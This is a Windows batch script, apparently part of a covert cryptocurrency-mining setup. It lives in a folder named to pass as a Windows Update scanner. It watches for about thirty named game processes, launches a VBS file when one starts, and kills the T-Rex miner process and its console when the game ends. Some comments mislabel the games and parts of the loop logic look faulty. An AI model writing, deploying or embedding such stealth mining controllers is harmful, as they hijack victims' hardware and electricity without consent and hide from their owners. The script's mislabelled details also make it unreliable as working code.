@echo off
set "WSUSSCAN_DIR=C:\ProgramData\WSUSSCAN"
set "TREX_WINDOW_TITLE=Console"
set "RUN_TREX_VBS=%WSUSSCAN_DIR%\2.vbs"

:: Extended list of popular games (with actual process names)
set "GAME1=csgo.exe"            :: Counter-Strike: Global Offensive
set "GAME2=dota2.exe"           :: Dota 2
set "GAME3=TsIGame.exe"         :: PlayerUnknown's Battlegrounds
set "GAME4=r5apex.exe"            :: Apex Legends
set "GAME5=GTA5.exe"            :: Grand Theft Auto V
set "GAME6=RainbowSix.exe"        :: Rainbow Six Siege
set "GAME7=terraria.exe"        :: Terraria
set "GAME8=phasmophobia.exe"    :: Phasmophobia
set "GAME9=VALORANT-Win64-Shipping.exe"        :: Valorant
set "GAME10=deadbydaylight-win64-shipping.exe" :: Dead by Daylight
set "GAME11=FortniteClient-Win64-Shipping.exe"       :: Fortnite
set "GAME12=cod.exe"        :: Call of Duty: Warzone
set "GAME13=overwatch.exe"      :: Overwatch
set "GAME14=FallGuys_client_game.exe" :: Fall Guys: Ultimate Knockout
set "GAME15=destiny2.exe"       :: Destiny 2
set "GAME16=monsterhunterworld.exe" :: Monster Hunter: World
set "GAME17=cyberpunk2077.exe"  :: Cyberpunk 2077
set "GAME18=hitman3.exe"        :: Hitman 3
set "GAME19=rustclient.exe"           :: Rust
set "GAME20=FarCry5.exe"   :: Tom Clancy's The Division 2
set "GAME21=fm.exe" :: Football Manager 2024
set "GAME22=LeagueClientUxRender.exe" :: League of Legends
set "GAME23=emptysolol.exe"          :: Steam (to detect Steam client)
set "GAME24=worldwarz.exe"      :: World War Z
set "GAME25=stardewvalley.exe"  :: Stardew Valley
set "GAME26=SevenKnights2Global.exe"   :: Seven Knights
set "GAME27=r5apex.exe"    :: Apex Legends
set "GAME28=gears5.exe"         :: Gears 5
set "GAME29=remnantfromtheashes.exe" :: Remnant: From the Ashes
set "GAME30=robloxplayerbeta.exe" :: Roblox Player Beta
set "GAME31=CookieClicker.exe" :: Cookie Clicker

:monitor
:: Check if any of the popular games are running
for %%G in (%GAME1% %GAME2% %GAME3% %GAME4% %GAME5% %GAME6% %GAME7% %GAME8% %GAME9% %GAME10% %GAME11% %GAME12% %GAME13% %GAME14% %GAME15% %GAME16% %GAME17% %GAME18% %GAME19% %GAME20% %GAME21% %GAME22% %GAME23% %GAME24% %GAME25% %GAME26% %GAME27% %GAME28% %GAME29% %GAME30% %GAME31%) do (
    tasklist /FI "IMAGENAME eq %%G" | find /I "%%G" >nul
    if "%ERRORLEVEL%"=="0" (
        cscript //nologo "%RUN_TREX_VBS%"
        :monitor_running
        timeout /T 5 >nul
        tasklist /FI "IMAGENAME eq %%G" | find /I "%%G" >nul
        if "%ERRORLEVEL%"=="0" (
            goto monitor_running
        ) else (
            REM Terminate t-rex.exe
            taskkill /F /IM t-rex.exe >nul 2>&1
            
            REM Close the TrexCMDWindow
            tasklist /FI "WINDOWTITLE eq %TREX_WINDOW_TITLE%" /FI "IMAGENAME eq cmd.exe" | find /I "cmd.exe" >nul
            if "%ERRORLEVEL%"=="0" (
                taskkill /F /FI "WINDOWTITLE eq %TREX_WINDOW_TITLE%"
            )
            
            goto monitor
        )
    )
)

:: If none of the games are running, wait and check again
timeout /T 5 >nul
goto monitor
